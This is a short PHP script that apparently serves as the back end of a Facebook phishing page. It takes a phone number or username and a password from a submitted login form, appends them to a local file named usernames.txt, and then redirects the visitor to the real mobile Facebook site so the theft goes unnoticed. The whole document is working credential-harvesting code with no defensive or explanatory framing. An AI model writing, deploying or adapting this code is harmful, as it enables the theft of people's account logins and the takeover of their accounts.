<?php
    file_put_contents("usernames.txt", "Username: " . $_POST['Number'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com');
exit();
